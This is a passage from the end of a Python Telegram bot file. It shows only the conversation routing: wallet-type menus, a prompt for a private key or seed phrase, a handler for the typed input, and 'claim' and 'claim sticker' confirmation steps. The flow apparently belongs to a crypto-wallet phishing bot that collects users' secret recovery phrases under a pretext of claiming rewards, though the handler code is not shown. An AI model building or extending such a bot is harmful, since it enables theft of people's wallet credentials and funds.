                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                CallbackQueryHandler(handle_claim_manually, pattern="^claim_manually$"),
            ],
            RECEIVE_INPUT: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ],
            CLAIM_STICKER_INPUT: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sticker_input),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            CLAIM_STICKER_CONFIRM: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(show_other_wallets, pattern=OTHER_WALLETS_PATTERN),
                CallbackQueryHandler(show_phrase_options, pattern=WALLET_TYPE_PATTERN),
                CallbackQueryHandler(handle_claim_sticker_confirmation, pattern="^claim_sticker_confirm_(yes|no)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
